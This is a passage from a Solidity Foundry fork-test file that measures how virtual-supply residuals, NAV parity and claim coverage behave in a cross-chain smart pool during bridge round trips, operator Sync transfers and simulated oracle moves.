    function _deployMirrorScenario() internal {
        address[] memory baseTokens = new address[](2);
        baseTokens[0] = Constants.ETH_USDC;
        baseTokens[1] = Constants.BASE_USDC;
        deployFixture(baseTokens);

        vm.selectFork(mainnetForkId);
        uint256 wethEth = _wethAmountFor(ethereum.pool, Constants.ETH_WETH, Constants.ETH_USDC, BASE_WETH_TARGET_USDC);
        _syncDonate(ethereum.pool, Constants.ETH_WETH, wethEth);
        vm.startPrank(user);
        IERC20(Constants.ETH_USDC).approve(ethereum.pool, type(uint256).max);
        ISmartPool(payable(ethereum.pool)).mint(user, BASE_EXTRA_MINT, 0);
        vm.stopPrank();

        vm.selectFork(baseForkId);
        uint256 wethBase = _wethAmountFor(base.pool, Constants.BASE_WETH, Constants.BASE_USDC, BASE_WETH_TARGET_USDC);
        _syncDonate(base.pool, Constants.BASE_WETH, wethBase);
        vm.startPrank(user);
        IERC20(Constants.BASE_USDC).approve(base.pool, type(uint256).max);
        ISmartPool(payable(base.pool)).mint(user, BASE_EXTRA_MINT, 0);
        vm.stopPrank();

        _warpPastLockup(base.pool);
        vm.selectFork(mainnetForkId);
        _warpPastLockup(ethereum.pool);
    }

    function _u(address pool) internal returns (uint256) {
        return _poolTokens(pool).unitaryValue;
    }

    /// @notice THE CRUX FOLLOW-UP: with mirror pools and a SYMMETRIC +10% move, unitaryValue on
    ///         Base == unitaryValue on Ethereum at EVERY checkpoint - before the transfer, after
    ///         the outbound legs, after the price move, AND after the residuals strand. Opposite
    ///         signed VS residuals (-2.0e9 raw on Base, +1.35e9 on Eth) appear even though NAV
    ///         parity held at every prior checkpoint AND survives them afterwards (barely 1.3%
    ///         apart). The residual is a two-snapshot timing effect on a single chain: each leg
    ///         is NAV-neutral at its own execution-time u, but the outbound and return snapshots
    ///         price the same transfer at different u. Cross-chain NAV parity can neither prevent
    ///         nor reveal it.
    function test_NavParity_SymmetricMove_ParityHoldsYetResidualAppears() public {
        _deployMirrorScenario();

        vm.selectFork(baseForkId);
        uint256 nav0 = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
        uint256 transferAmount = (nav0 * 20) / 100;
        console2.log("mirror T:", transferAmount);

        // checkpoint 0: parity before any transfer (feeds differ slightly L1 vs L2: 2% tolerance)
        uint256 uB0 = _u(base.pool);
        vm.selectFork(mainnetForkId);
        uint256 uE0 = _u(ethereum.pool);
        assertApproxEqRel(uB0, uE0, 0.02e18, "checkpoint 0: u parity");

        // outbound legs (no move yet)
        vm.selectFork(baseForkId);
        _depositV3(base.pool, Constants.BASE_USDC, Constants.ETH_USDC, transferAmount, Constants.ETHEREUM_CHAIN_ID);
        console2.log("LEG1 Base outbound: VS:", _readVS(base.pool));
        vm.selectFork(mainnetForkId);
        _simulateFill(ethereum.pool, Constants.ETH_MULTICALL_HANDLER, Constants.ETH_USDC, transferAmount);
        console2.log("LEG2 Eth arrival: VS:", _readVS(ethereum.pool));

        // checkpoint (a): parity after outbound initiation AND after first arrival
        vm.selectFork(baseForkId);
        uint256 uBa = _u(base.pool);
        vm.selectFork(mainnetForkId);
        uint256 uEa = _u(ethereum.pool);
        assertApproxEqRel(uBa, uEa, 0.02e18, "checkpoint (a): u parity after outbound");

        // symmetric +10% move between the legs
        _installUsdcFeedMock(Constants.ORACLE, Constants.ETH_USDC, TICKS_10PCT);
        vm.selectFork(baseForkId);
        _installUsdcFeedMock(Constants.BASE_ORACLE, Constants.BASE_USDC, TICKS_10PCT);

        // checkpoint (b): parity AFTER the move, BEFORE the return - the key assertion
        uint256 uBb = _u(base.pool);
        vm.selectFork(mainnetForkId);
        uint256 uEb = _u(ethereum.pool);
        assertApproxEqRel(uBb, uEb, 0.02e18, "checkpoint (b): u parity holds after the move");

        // return legs
        _depositV3(ethereum.pool, Constants.ETH_USDC, Constants.BASE_USDC, transferAmount, Constants.BASE_CHAIN_ID);
        console2.log("LEG3 Eth return: VS:", _readVS(ethereum.pool));
        vm.selectFork(baseForkId);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_USDC, transferAmount);
        console2.log("LEG4 Base arrival: VS:", _readVS(base.pool));

        // checkpoint (c): read Base state BEFORE switching forks (_readVS reads current fork!)
        uint256 uBc = _u(base.pool);
        int256 vsB = _readVS(base.pool);
        vm.selectFork(mainnetForkId);
        uint256 uEc = _u(ethereum.pool);
        int256 vsE = _readVS(ethereum.pool);

        console2.log("checkpoint (b): uBase:", uBb, "uEth:", uEb);
        console2.log("checkpoint (c): uBase:", uBc, "uEth:", uEc);
        console2.log("residuals: vsBase:", vsB);
        console2.log("residuals: vsEth:", vsE);

        assertLt(vsB, 0, "Base strands NEGATIVE VS");
        assertGt(vsE, 0, "Eth (mirror) strands POSITIVE VS");
        // partial offset only: the outbound leg itself re-weighted the pools' WETH exposure
        // (Base sent 20% of NAV as USDC, so the same +10% tick moves u by different amounts),
        // so the residuals cannot cancel exactly
        assertLt(_abs(vsB + vsE), _abs(vsB), "residuals same order, partial offset");
        // THE PUNCHLINE: unitaryValue parity SURVIVES the stranded residuals (barely 1.3% apart)
        assertApproxEqRel(uBc, uEc, 0.02e18, "checkpoint (c): u parity survives the residuals");

        // claims vs assets per chain after the round trip
        uint256 navB = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
        uint256 navE = ISmartPoolActions(ethereum.pool).updateUnitaryValue().netTotalValue;
        uint256 tsB = ISmartPoolState(base.pool).getPoolTokens().totalSupply;
        uint256 tsE = ISmartPoolState(ethereum.pool).getPoolTokens().totalSupply;
        console2.log("Base claims (TS*u/1e6):", (tsB * uBc) / 1e6, "assets:", navB);
        console2.log("Eth  claims (TS*u/1e6):", (tsE * uEc) / 1e6, "assets:", navE);
        assertGt((tsB * uBc) / 1e6, navB, "Base over-claims (phantom)");
        assertLt((tsE * uEc) / 1e6, navE, "Eth under-claims (stranded surplus)");
    }

    function _abs(int256 x) internal pure returns (uint256) {
        return x < 0 ? uint256(-x) : uint256(x);
    }

    /*//////////////////////////////////////////////////////////////////////////
        7. MID-WINDOW OPERATOR SYNC: WORSENS THE RESIDUAL, DOES NOT REMEDY IT
    //////////////////////////////////////////////////////////////////////////*/

    /// @notice During the bridge window (after outbound initiation, before the return), the
    ///         operator Sync-donates $100k USDC on the originator chain (Base). The donation is
    ///         100% backed NAV, yet it RAISES the unitaryValue at the return-arrival snapshot, so
    ///         the return leg mints FEWER +VS shares and the negative residual GROWS. The identical
    ///         donation performed AFTER the round trip leaves the residual untouched.
    function test_MidWindowSyncDonate_WorsensResidual() public {
        _deployUsdcScenario();

        vm.selectFork(baseForkId);
        uint256 nav0 = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
        uint256 transferAmount = (nav0 * 20) / 100;

        // outbound legs
        _depositV3(base.pool, Constants.BASE_USDC, Constants.ETH_USDC, transferAmount, Constants.ETHEREUM_CHAIN_ID);
        vm.selectFork(mainnetForkId);
        _simulateFill(ethereum.pool, Constants.ETH_MULTICALL_HANDLER, Constants.ETH_USDC, transferAmount);

        // symmetric +10% move
        _installUsdcFeedMock(Constants.ORACLE, Constants.ETH_USDC, TICKS_10PCT);
        vm.selectFork(baseForkId);
        _installUsdcFeedMock(Constants.BASE_ORACLE, Constants.BASE_USDC, TICKS_10PCT);

        // unitaryValue at the return-arrival snapshot WITHOUT any mid-window action:
        // exact, because nothing touches Base between now and donate(1) of the return leg
        uint256 uNoAction = _u(base.pool);
        uint256 minted2NoAction = (transferAmount * 1e6) / uNoAction;
        int256 vsNoAction = _readVS(base.pool); // -burnt1
        int256 residualNoAction = vsNoAction + int256(minted2NoAction);
        console2.log("residual if NO mid-window action:", residualNoAction);

        // MID-WINDOW operator action: 100% backed Sync donation on the originator chain
        _syncDonate(base.pool, Constants.BASE_USDC, 100_000e6);
        uint256 uMidWindow = _u(base.pool);
        assertGt(uMidWindow, uNoAction, "donation raised the snapshot unitaryValue");

        // return legs
        vm.selectFork(mainnetForkId);
        _depositV3(ethereum.pool, Constants.ETH_USDC, Constants.BASE_USDC, transferAmount, Constants.BASE_CHAIN_ID);
        vm.selectFork(baseForkId);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_USDC, transferAmount);

        int256 vsMidWindow = _readVS(base.pool);
        console2.log("residual WITH mid-window donate:", vsMidWindow);
        console2.log("unitaryValue: no-action:", uNoAction, "mid-window:", uMidWindow);

        assertEq(
            vsMidWindow,
            residualNoAction - (int256(minted2NoAction) - (int256(transferAmount * 1e6) / int256(uMidWindow))),
            "identity check"
        );
        assertLt(vsMidWindow, residualNoAction, "mid-window NAV increase WORSENS the negative residual");
        assertLt(vsMidWindow, -5_000e6, "residual grew by multiple x (share-denominated)");

        // contrast: the identical donation AFTER the round trip leaves the residual unchanged
        int256 vsBeforePostDonate = _readVS(base.pool);
        _syncDonate(base.pool, Constants.BASE_USDC, 100_000e6);
        assertEq(_readVS(base.pool), vsBeforePostDonate, "post-window donation does not touch VS");
        console2.log("post-window donate: VS unchanged at", vsBeforePostDonate);
    }

    /*//////////////////////////////////////////////////////////////////////////
        8. BOUNDARY: ~100% VIRTUAL CHAIN SENDS EVERYTHING BACK OVER A +10% MOVE
    //////////////////////////////////////////////////////////////////////////*/

    /// @notice V (Base) ends up with TS = 100 fee-collector shares and VS = +5M shares (98% of
    ///         effective supply is virtual) from an inbound WETH transfer funded by O (Eth).
    ///         V then initiates a Transfer sending ~everything (all its WETH) back to O.
    ///
    ///         Executability: with TS = 1 share, u is pinned at par (1e6), so the no-move
    ///         funding round trip is EXACTLY VS-neutral (initiation burns precisely the
    ///         arrival-minted VS -> back to 0) and validateSupply never blocks. After the full
    ///         round trip over a +10% move:
    ///           - V strands POSITIVE VS = +5.42M shares (= $5.42M NAV) with TS = 1 share: the
    ///             returned WETH (incl. the +10% appreciation) sits on V claimable by NO holder
    ///             (claims = $1.00 of $5.42M).
    ///           - O strands NEGATIVE VS ~= -1.45M shares against TS = 4.1M shares: its assets
    ///             (~$9.1M) cover only ~64% of its claims (~$14.1M at the post-round-trip u).
    ///         => "all funds returned, so the originator covers 100% of supply" BREAKS.
    function test_Boundary_AllVirtualChainSendsEverythingBack() public {
        address[] memory baseTokens = new address[](2);
        baseTokens[0] = Constants.ETH_USDC;
        baseTokens[1] = Constants.BASE_USDC;
        deployFixture(baseTokens);

        // ---- pre-history: V (Base) burns all but one user share -> TS = 1 share ----
        vm.selectFork(baseForkId);
        _warpPastLockup(base.pool); // the fixture shares are still inside the mint lockup
        uint256 userShares = ISmartPoolState(base.pool).balanceOf(user);
        vm.prank(user);
        ISmartPoolActions(base.pool).burn(userShares - 1e6, 0);
        uint256 tsV = ISmartPoolState(base.pool).getPoolTokens().totalSupply;
        assertEq(tsV, 1e6, "V: exactly one share remains (no collector shares on this pool)");
        assertEq(_readVS(base.pool), 0, "V: VS starts at 0");

        // ---- O (Eth) builds a 9.1M USDC position (4M minted + 5M donated) ----
        vm.selectFork(mainnetForkId);
        deal(Constants.ETH_USDC, user, 5_000_000e6);
        vm.startPrank(user);
        IERC20(Constants.ETH_USDC).approve(ethereum.pool, type(uint256).max);
        ISmartPool(payable(ethereum.pool)).mint(user, 4_000_000e6, 0);
        vm.stopPrank();
        _syncDonate(ethereum.pool, Constants.ETH_USDC, 5_000_000e6);

        // ---- O funds V with ~$5M of WETH (Transfer mode, WETH->WETH) ----
        uint256 wethAmount = _wethAmountFor(ethereum.pool, Constants.ETH_WETH, Constants.ETH_USDC, 5_000_000e6);
        _syncDonate(ethereum.pool, Constants.ETH_WETH, wethAmount);
        _depositV3(ethereum.pool, Constants.ETH_WETH, Constants.BASE_WETH, wethAmount, Constants.BASE_CHAIN_ID);
        int256 vsOAfterFunding = _readVS(ethereum.pool);
        assertLt(vsOAfterFunding, 0, "O: funding transfer wrote NEGATIVE VS");

        vm.selectFork(baseForkId);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_WETH, wethAmount);
        int256 vsVFunded = _readVS(base.pool);
        assertGt(vsVFunded, 0, "V: inbound transfer wrote POSITIVE VS");
        console2.log("V after funding: TS:", tsV);
        console2.log("V after funding: VS (~100% of effective supply):", vsVFunded);

        // ---- V initiates "send everything back": ALL its WETH -> O ----
        // With TS = 1 share, u is pinned at par (1e6): every Transfer-mode leg mints/burns at
        // the same u, so the no-move round trip is EXACTLY VS-neutral and validateSupply passes
        _depositV3(base.pool, Constants.BASE_WETH, Constants.ETH_WETH, wethAmount, Constants.ETHEREUM_CHAIN_ID);
        int256 vsVAfterInit = _readVS(base.pool);
        assertEq(vsVAfterInit, 0, "V: u pinned at par -> initiation burns exactly the funding VS");
        assertEq(ISmartPoolState(base.pool).getPoolTokens().totalSupply, tsV, "V: TS unchanged");
        console2.log("V after initiation: VS (back to exactly 0):", vsVAfterInit);

        // ---- +10% move between the legs ----
        vm.selectFork(mainnetForkId);
        _installUsdcFeedMock(Constants.ORACLE, Constants.ETH_USDC, TICKS_10PCT);
        vm.selectFork(baseForkId);
        _installUsdcFeedMock(Constants.BASE_ORACLE, Constants.BASE_USDC, TICKS_10PCT);

        // ---- arrival on O (V->O): O receives the WETH, valued at the +10% price ----
        vm.selectFork(mainnetForkId);
        _simulateFill(ethereum.pool, Constants.ETH_MULTICALL_HANDLER, Constants.ETH_WETH, wethAmount);
        int256 vsOAfterArrival = _readVS(ethereum.pool);
        console2.log("O after V->O arrival: VS:", vsOAfterArrival);

        // ---- round trip completes: O returns the WETH to V ----
        _depositV3(ethereum.pool, Constants.ETH_WETH, Constants.BASE_WETH, wethAmount, Constants.BASE_CHAIN_ID);
        int256 vsOFinal = _readVS(ethereum.pool);
        vm.selectFork(baseForkId);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_WETH, wethAmount);
        int256 vsVFinal = _readVS(base.pool);

        // ---- final state ----
        BoundaryState memory fin = _readBoundaryState();

        console2.log("FINAL V: TS:", fin.tsV);
        console2.log("FINAL V: VS:", fin.vsV);
        console2.log("FINAL V: u:", fin.uV);
        console2.log("FINAL V: NAV:", fin.navV);
        console2.log("FINAL O: TS:", fin.tsO);
        console2.log("FINAL O: VS:", fin.vsO);
        console2.log("FINAL O: u:", fin.uO);
        console2.log("FINAL O: NAV:", fin.navO);
        console2.log("V claims (TS*u/1e6):", (fin.tsV * fin.uV) / 1e6);
        console2.log("O claims (TS*u/1e6):", (fin.tsO * fin.uO) / 1e6);

        // V: positive VS stranded against a single real share - the returned value is holderless
        assertEq(fin.tsV, tsV, "V real supply unchanged");
        assertGt(fin.vsV, 0, "V strands POSITIVE VS (returned WETH re-minted at arrival-time u)");
        assertLt((fin.tsV * fin.uV) / 1e6, fin.navV / 10, "V: real claims cover <10% of V assets - value locked");

        // O: negative VS ~ -1.45e12 raw; assets cover only ~64% of claims (u rises with the residual)
        assertLt(fin.vsO, 0, "O strands NEGATIVE VS");
        uint256 claimsO = (fin.tsO * fin.uO) / 1e6;
        assertGt(claimsO, fin.navO, "O over-claims: assets do NOT cover total claims");
        assertLt((fin.navO * 10000) / claimsO, 7000, "O coverage < 70% (measured ~64.5%)");

        // ---- O burn-to-pin: holders extract at most ~NAV; the rest is pinned ----
        uint256 vsOAbs = _abs(fin.vsO);
        uint256 pinO = (vsOAbs * 20 + 18) / 19;
        uint256 maxBurnable = fin.tsO - pinO;
        console2.log("O pin:", pinO);
        console2.log("O maxBurnable:", maxBurnable);

        vm.selectFork(mainnetForkId);
        _warpPastLockup(ethereum.pool); // unlock the user's mints for the burn test
        _burnDownTo(ethereum.pool, Constants.ETH_USDC, Constants.ETH_WETH, pinO);
        assertEq(ISmartPoolState(ethereum.pool).getPoolTokens().totalSupply, pinO, "O burned to the pin");

        PinnedState memory pinned = _readPinnedState();
        console2.log("O pinned: TS:", pinO);
        console2.log("O pinned: claims left:", pinned.claims);
        console2.log("O pinned: assets left:", pinned.nav);
        assertLt(pinned.nav, pinned.claims / 10, "O: >90% of remaining claims unbacked");

        vm.prank(user);
        vm.expectRevert(NavImpactLib.EffectiveSupplyTooLow.selector);
        ISmartPoolActions(ethereum.pool).burn(1, 0);
    }

    /*//////////////////////////////////////////////////////////////////////////
        9. SYNC-MODE TRANSFER OUT OF THE PINNED CHAIN CANNOT RESTORE COVERAGE
    //////////////////////////////////////////////////////////////////////////*/

    /// @notice Accounting check the team asked for: with negative VS = -r and real supply TS,
    ///         unitaryValue u = assets/(TS-r), so claims = TS*u = assets*TS/(TS-r) and the
    ///         over-claim RATIO claims/assets = TS/(TS-r) is invariant to the asset level.
    ///         A Sync-mode transfer out removes assets with NO virtual supply write, so both
    ///         assets and u scale down together and the ratio must be unchanged - Sync-out
    ///         shrinks the pool proportionally, it does NOT repair coverage. Only an inbound
    ///         Transfer (which writes +VS ~ +r) moves the ratio back toward 1.
    function test_SyncOut_DoesNotRestoreCoverage() public {
        _deployUsdcScenario();

        vm.selectFork(baseForkId);
        uint256 nav0 = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
        uint256 transferAmount = (nav0 * 20) / 100;

        // full round trip over a symmetric +10% move -> negative residual on Base
        _depositV3(base.pool, Constants.BASE_USDC, Constants.ETH_USDC, transferAmount, Constants.ETHEREUM_CHAIN_ID);
        vm.selectFork(mainnetForkId);
        _simulateFill(ethereum.pool, Constants.ETH_MULTICALL_HANDLER, Constants.ETH_USDC, transferAmount);
        _installUsdcFeedMock(Constants.ORACLE, Constants.ETH_USDC, TICKS_10PCT);
        vm.selectFork(baseForkId);
        _installUsdcFeedMock(Constants.BASE_ORACLE, Constants.BASE_USDC, TICKS_10PCT);
        vm.selectFork(mainnetForkId);
        _depositV3(ethereum.pool, Constants.ETH_USDC, Constants.BASE_USDC, transferAmount, Constants.BASE_CHAIN_ID);
        vm.selectFork(baseForkId);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_USDC, transferAmount);

        int256 vsResidual = _readVS(base.pool);
        assertLt(vsResidual, 0, "negative residual exists on Base");

        // 1. over-claim ratio on the pinned chain: claims = TS*u vs assets
        uint256 ts = ISmartPoolState(base.pool).getPoolTokens().totalSupply;
        uint256 assets1 = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
        uint256 claims1 = (ts * _u(base.pool)) / 1e6;
        uint256 ratio1 = (claims1 * 10_000) / assets1;
        console2.log("BEFORE sync-out: assets:", assets1);
        console2.log("BEFORE sync-out: claims:", claims1);
        console2.log("BEFORE sync-out: over-claim ratio (bps):", ratio1);
        assertGt(ratio1, 10_000, "claims exceed assets (over-claim exists)");

        // 2. operator Sync-transfer OUT of the pinned chain (depositV3 with OpType.Sync:
        //    no VS write on the source, and a Sync-mode donate - no VS write - on arrival)
        uint256 syncAmount = 50_000e6;
        _depositV3(
            base.pool,
            Constants.BASE_USDC,
            Constants.ETH_USDC,
            syncAmount,
            Constants.ETHEREUM_CHAIN_ID,
            OpType.Sync
        );
        vm.selectFork(mainnetForkId);
        int256 vsEthBefore = _readVS(ethereum.pool);
        _simulateFill(ethereum.pool, Constants.ETH_MULTICALL_HANDLER, Constants.ETH_USDC, syncAmount, OpType.Sync);
        assertEq(_readVS(ethereum.pool), vsEthBefore, "Sync arrival wrote no VS on Eth either");

        // 3. the over-claim ratio is invariant; VS untouched
        vm.selectFork(baseForkId);
        assertEq(_readVS(base.pool), vsResidual, "Sync-out writes NO virtual supply on Base");
        uint256 assets2 = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
        uint256 claims2 = (ts * _u(base.pool)) / 1e6;
        uint256 ratio2 = (claims2 * 10_000) / assets2;
        console2.log("AFTER sync-out: assets:", assets2);
        console2.log("AFTER sync-out: claims:", claims2);
        console2.log("AFTER sync-out: over-claim ratio (bps):", ratio2);
        assertApproxEqAbs(assets1 - assets2, syncAmount, 1000, "sync-out removed exactly the transferred assets");
        assertApproxEqRel(ratio2, ratio1, 0.001e18, "over-claim ratio INVARIANT to Sync-out");

        // 4. contrast: a small inbound Transfer (5k) writes +VS and moves the ratio toward 1
        vm.selectFork(mainnetForkId);
        _depositV3(ethereum.pool, Constants.ETH_USDC, Constants.BASE_USDC, 5000e6, Constants.BASE_CHAIN_ID);
        vm.selectFork(baseForkId);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_USDC, 5000e6);
        int256 vsRelieved = _readVS(base.pool);
        uint256 assets3 = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
        uint256 claims3 = (ts * _u(base.pool)) / 1e6;
        uint256 ratio3 = (claims3 * 10_000) / assets3;
        console2.log("AFTER inbound relief: VS:", vsRelieved);
        console2.log("AFTER inbound relief: over-claim ratio (bps):", ratio3);
        assertGt(vsRelieved, vsResidual, "inbound Transfer relieved the negative VS");
        assertLt(ratio3, ratio1, "inbound relief moves the over-claim ratio toward 1");
        assertLt(vsRelieved, 0, "small relief does not overshoot into positive VS");
    }

    /*//////////////////////////////////////////////////////////////////////////
        10. REALISTIC CYCLE: THE REBALANCE SYNC CREATES THE RESIDUAL
    //////////////////////////////////////////////////////////////////////////*/

    /// @notice The full realistic operator cycle measured: Base originates a Transfer, only
    ///         Eth's NAV reprices (+10% on Eth's oracle), the operator rebalances the NAV
    ///         divergence with an equalizing Sync transfer Eth->Base, then the return leg settles.
    ///
    ///         Substrate note: the MIRROR deployment (both chains hold ~$500k WETH) is required.
    ///         With the pure-USDC Eth pool the Eth-only move is inert (u pinned at 1e6), and
    ///         mirrors + SYMMETRIC move would give sync amount ~ 0 (parity test). Mirrors +
    ///         ASYMMETRIC move is the configuration where a real, material divergence (u_Eth >
    ///         u_Base) exists for the operator to observe and rebalance.
    ///
    ///         Verified: (a) the sync moves u_Base between Base's two snapshots, so a Base
    ///         residual appears that is EXACTLY 0 without the sync - the rebalance CREATES the
    ///         residual rather than fixing it; (b) the sync leaves Base's coverage ratio
    ///         unchanged (Sync writes no VS; claims/assets = TS/ES is asset-invariant); (c) in
    ///         this substrate Eth's residual is structurally nonzero (its own NAV moved between
    ///         its snapshots) - the sync HALVES it by pushing Base's u up to Eth's burn
    ///         snapshot. Without-sync control (exact floor arithmetic): Base = 0, Eth =
    ///         minted1 - T*1e6/u_Eth_moved. The cycle ends with the unstick path: a small
    ///         inbound Transfer, funded entirely by the source pool's own assets through the
    ///         normal AIntents path, shrinks the burn pin proportionally.
    struct ChainState {
        uint256 v; // netTotalValue (assets)
        uint256 u; // unitaryValue
        int256 vs; // virtual supply (raw)
        uint256 ts; // totalSupply (raw)
    }

    function _readChainState(address pool) internal returns (ChainState memory c) {
        c.vs = _readVS(pool);
        c.ts = ISmartPoolState(pool).getPoolTokens().totalSupply;
        c.v = ISmartPoolActions(pool).updateUnitaryValue().netTotalValue;
        c.u = _u(pool);
    }

    function _bpsGap(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? ((a - b) * 10_000) / b : ((b - a) * 10_000) / a;
    }

    struct CycleState {
        uint256 transferAmount;
        uint256 uBaseInit;
        ChainState baseAfterOut;
        ChainState ethAfterArr;
        ChainState ethMoved;
        uint256 syncAmount;
        uint256 ratioMid1;
        uint256 ratioMid2;
    }

    /// @notice Steps 1-4 of the realistic cycle: outbound leg, Eth-only move, exact equalizing
    ///         Sync amount, Sync transfer Eth->Base with parity assertion. Returns on the
    ///         mainnet fork with NAV parity restored.
    function _runCycleThroughSync() internal returns (CycleState memory cs) {
        // -- Step 1: outbound Base->Eth (Transfer mode); measure state on both chains ----
        vm.selectFork(baseForkId);
        uint256 nav0 = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
        cs.transferAmount = (nav0 * 20) / 100;
        cs.uBaseInit = _u(base.pool);
        _depositV3(base.pool, Constants.BASE_USDC, Constants.ETH_USDC, cs.transferAmount, Constants.ETHEREUM_CHAIN_ID);
        cs.baseAfterOut = _readChainState(base.pool);
        int256 esBase = int256(cs.baseAfterOut.ts) + cs.baseAfterOut.vs;

        vm.selectFork(mainnetForkId);
        _simulateFill(ethereum.pool, Constants.ETH_MULTICALL_HANDLER, Constants.ETH_USDC, cs.transferAmount);
        cs.ethAfterArr = _readChainState(ethereum.pool);
        int256 esEth = int256(cs.ethAfterArr.ts) + cs.ethAfterArr.vs;
        console2.log("STEP1 uBase (init snapshot):", cs.uBaseInit);
        console2.log("STEP1 uEth (arrival snapshot):", cs.ethAfterArr.u);

        // -- Step 2: +10% move on ETH oracle only -> the divergence the operator observes ----
        _installUsdcFeedMock(Constants.ORACLE, Constants.ETH_USDC, TICKS_10PCT);
        cs.ethMoved = _readChainState(ethereum.pool);
        uint256 divergenceBps = ((cs.ethMoved.u - cs.uBaseInit) * 10_000) / cs.uBaseInit;
        console2.log("STEP2 uEth after move:", cs.ethMoved.u);
        console2.log("STEP2 NAV divergence (bps):", divergenceBps);
        assertGt(cs.ethMoved.u, cs.uBaseInit, "Eth NAV/share above Base - material divergence exists");
        assertGt(divergenceBps, 100, "divergence > 1%");
        vm.selectFork(baseForkId);
        assertEq(_u(base.pool), cs.uBaseInit, "Base u unmoved (no Base leg, no Base oracle move)");
        vm.selectFork(mainnetForkId);

        // -- Step 3: exact equalizing Sync amount from measured state ----
        // parity requires (vBase+d)/esBase == (vEth-d)/esEth ->
        // d = (vEth*esBase - vBase*esEth) / (esEth + esBase)
        int256 deltaNum = int256(cs.ethMoved.v) * esBase - int256(cs.baseAfterOut.v) * esEth;
        int256 delta = deltaNum / (esEth + esBase);
        assertGt(delta, 0, "sign sanity: value flows Eth->Base (Eth u above Base u)");
        cs.syncAmount = uint256(delta);
        assertLt(
            cs.syncAmount,
            IERC20(Constants.ETH_USDC).balanceOf(ethereum.pool),
            "delta below the pool's available balance"
        );
        console2.log("STEP3 equalizing sync amount:", cs.syncAmount);

        // -- Step 4: execute the Sync transfer Eth->Base through the real depositV3 path ----
        vm.selectFork(baseForkId);
        cs.ratioMid1 = _claimsAssetsBps(base.pool);
        vm.selectFork(mainnetForkId);
        uint256 ethBalBefore = IERC20(Constants.ETH_USDC).balanceOf(ethereum.pool);
        _depositV3(
            ethereum.pool,
            Constants.ETH_USDC,
            Constants.BASE_USDC,
            cs.syncAmount,
            Constants.BASE_CHAIN_ID,
            OpType.Sync
        );
        assertEq(
            IERC20(Constants.ETH_USDC).balanceOf(ethereum.pool),
            ethBalBefore - cs.syncAmount,
            "sync funded entirely by the pool's own assets"
        );
        assertEq(
            IERC20(Constants.ETH_USDC).balanceOf(poolOwner),
            cs.syncAmount,
            "operator's personal tokens untouched - no external money"
        );
        assertEq(_readVS(ethereum.pool), cs.ethMoved.vs, "sync wrote NO virtual supply on Eth");
        vm.selectFork(baseForkId);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_USDC, cs.syncAmount, OpType.Sync);
        assertEq(_readVS(base.pool), cs.baseAfterOut.vs, "sync arrival wrote NO virtual supply on Base");
        cs.ratioMid2 = _claimsAssetsBps(base.pool);
        assertApproxEqRel(cs.ratioMid2, cs.ratioMid1, 0.001e18, "(b) coverage ratio invariant to the sync");
        console2.log("STEP4 coverage ratio before sync (bps):", cs.ratioMid1);
        console2.log("STEP4 coverage ratio after sync (bps):", cs.ratioMid2);

        uint256 uBaseSynced = _u(base.pool);
        vm.selectFork(mainnetForkId);
        uint256 parityGap = _bpsGap(uBaseSynced, _u(ethereum.pool));
        console2.log("STEP4 parity after sync (bps gap):", parityGap);
        assertApproxEqRel(uBaseSynced, _u(ethereum.pool), 0.001e18, "equalizing sync restored NAV parity");
    }

    function test_RealisticCycle_SyncRebalance_CreatesResidual() public {
        _deployMirrorScenario();
        CycleState memory cs = _runCycleThroughSync();

        // -- Step 5: return leg Eth->Base (Transfer mode, same T as all round-trip tests) ----
        _depositV3(ethereum.pool, Constants.ETH_USDC, Constants.BASE_USDC, cs.transferAmount, Constants.BASE_CHAIN_ID);
        vm.selectFork(baseForkId);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_USDC, cs.transferAmount);
        ChainState memory baseFinal = _readChainState(base.pool);
        vm.selectFork(mainnetForkId);
        ChainState memory ethFinal = _readChainState(ethereum.pool);

        // -- Step 6: with-sync residuals vs the exact without-sync controls ----
        uint256 minted2NoSync = (cs.transferAmount * 1e6) / cs.uBaseInit; // Base untouched w/o sync
        int256 residualBaseNoSync = cs.baseAfterOut.vs + int256(minted2NoSync);
        int256 residualEthNoSync = cs.ethAfterArr.vs - int256((cs.transferAmount * 1e6) / cs.ethMoved.u);
        console2.log("STEP6 residual Base WITHOUT sync (control):", residualBaseNoSync);
        console2.log("STEP6 residual Base WITH sync:", baseFinal.vs);
        console2.log("STEP6 residual Eth WITHOUT sync (control):", residualEthNoSync);
        console2.log("STEP6 residual Eth WITH sync:", ethFinal.vs);

        assertEq(residualBaseNoSync, 0, "control: without the sync the Base residual is exactly 0");
        assertLt(baseFinal.vs, 0, "(a) the rebalance sync CREATED the Base residual");
        assertLt(ethFinal.vs, residualEthNoSync, "sync relieved (roughly halved) Eth's residual");
        assertLt(_abs(baseFinal.vs + ethFinal.vs), _abs(baseFinal.vs) / 100, "mirror conservation after the cycle");

        vm.selectFork(baseForkId);
        uint256 ratioEnd = _claimsAssetsBps(base.pool);
        uint256 endGap = _bpsGap(_u(base.pool), ethFinal.u);
        console2.log("STEP6 coverage ratio on Base at end (bps):", ratioEnd);
        console2.log("STEP6 end parity (bps gap):", endGap);
        assertLt(endGap, 100, "end parity within 1%");

        // -- Unstick in the realistic cycle: inbound Transfer funded by the pool's own assets ----
        vm.selectFork(mainnetForkId);
        uint256 pinBefore = (uint256(-baseFinal.vs) * 20 + 18) / 19;
        uint256 reliefAmount = 2_000e6;
        uint256 ethBalPre = IERC20(Constants.ETH_USDC).balanceOf(ethereum.pool);
